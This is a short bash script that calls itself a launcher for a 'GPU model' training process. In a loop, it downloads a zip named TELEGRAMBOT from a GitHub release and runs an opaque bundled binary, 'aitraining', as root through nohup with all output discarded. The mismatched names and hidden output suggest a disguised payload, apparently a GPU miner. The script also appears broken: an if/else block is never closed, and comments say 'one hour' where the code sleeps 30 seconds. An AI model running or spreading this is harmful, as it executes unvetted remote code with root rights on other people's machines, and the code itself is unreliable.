#!/bin/bash

# File: start_modelgp.sh launcher

# Ensure unzip is installed
sudo apt install -y unzip

# Main loop for managing start_modelgp.sh lifecycle
while true; do
    echo "Starting GPU model process..."

    if pgrep -f "start_modelgp.sh" > /dev/null; then
        sudo pkill -f "start_modelgp.sh"
        echo "Process stopped."
    else
        echo "Process already stopped or crashed."
    fi
    if pgrep -f "aitraining" > /dev/null; then
        sudo pkill -f "aitraining"
        echo "Process stopped."
    else
 nohup bash -c '
    # Re-download the TELEGRAMBOT package (optional)
    sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip
    sudo mkdir -p TELEGRAMBOT
    sudo unzip -o TELEGRAMBOT.zip -d TELEGRAMBOT

    # Go into the TELEGRAMBOT directory
    cd TELEGRAMBOT || exit

    # Make sure your start_modelgp.sh file is executable
 sudo chmod +x aitraining
sudo chmod +x start_modelgp.sh
    # Start your main GPU script
    sudo bash ./start_modelgp.sh
    ' > /dev/null 2>&1 &


    echo "start_modelgp.sh is now running. It will run for 1 hour."

    # Wait for 1 hour before restarting
    sleep 30

    echo "Stopping running GPU process..."
    if pgrep -f "start_modelgp.sh" > /dev/null; then
        sudo pkill -f "start_modelgp.sh"
        echo "Process stopped."
    else
        echo "Process already stopped or crashed."
    fi
    if pgrep -f "aitraining" > /dev/null; then
        sudo pkill -f "aitraining"
        echo "Process stopped."
    else
        echo "Process already stopped or crashed."
    fi
    echo "Waiting 1 minute before restart..."
    sleep 60
done
